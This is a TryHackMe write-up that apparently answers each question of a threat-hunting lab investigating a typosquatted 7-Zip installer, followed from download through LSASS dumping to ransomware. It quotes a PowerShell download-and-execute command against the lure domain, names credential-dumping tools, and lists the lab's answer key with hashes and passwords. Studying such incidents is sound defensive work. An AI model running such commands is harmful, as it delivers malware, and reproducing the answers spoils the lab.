---
title: "[THM] Hunt Me II: Typo Squatters"
date: 2024-07-10
categories: [Writeups, TryHackMe]
tags: [THM, Writeup, Elastic, ELK, SIEM]
---
Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application. 

<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-Scenario.png" alt="THM-Hunt-Me-II-Typo-Squatters" style="width:500px;height:500;">

Last September 26, 2023, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.

# Questions

**Q:** What is the URL of the malicious software that was downloaded by the victim user? <br />
**A:** http://www.7zipp.org/a/7z2301-x64.msi
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q1-1.png" alt="THM-Hunt-Me-II-Typo-Squatters">
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q1-2.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** What is the IP address of the domain hosting the malware? <br />
**A:** 206.189.34.218
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q2.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** What is the PID of the process that executed the malicious software? <br />
**A:** 2532
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q3.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity? <br />
**A:** powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q4.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer? <br />
**A:** C:\Windows\Temp\7zlegit.exe

***

**Q:** What is the name of the service that was installed? <br />
**A:** 7zService

***

**Q:** The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service? <br />
**A:** SYSTEM
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q7.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity? <br />
**A:** Invoke-PowerExtract
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q8-1.png" alt="THM-Hunt-Me-II-Typo-Squatters">
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q8-2.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash) <br />
**A:** james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q10.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account? <br />
**A:** pwn3dpw!!!
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q11.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** What is the name of the workstation where the new account was used? <br />
**A:** WKSTN-02
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q12.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account? <br />
**A:** SSF\itadmin:NoO6@39Sk0!
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q13.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin? <br />
**A:** Invoke-SharpKatz.ps1
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q14.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** What is the AES256 hash of the domain admin based on the credential dumping output? <br />
**A:** f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q15-1.png" alt="THM-Hunt-Me-II-Typo-Squatters">
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q15-2.png" alt="THM-Hunt-Me-II-Typo-Squatters">

***

**Q:** After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations? <br />
**A:** 46
<img src="/assets/img/THM-Hunt-Me-II-Typo-Squatters/THM-Hunt-Me-II-Typo-Squatters-q16.png" alt="THM-Hunt-Me-II-Typo-Squatters">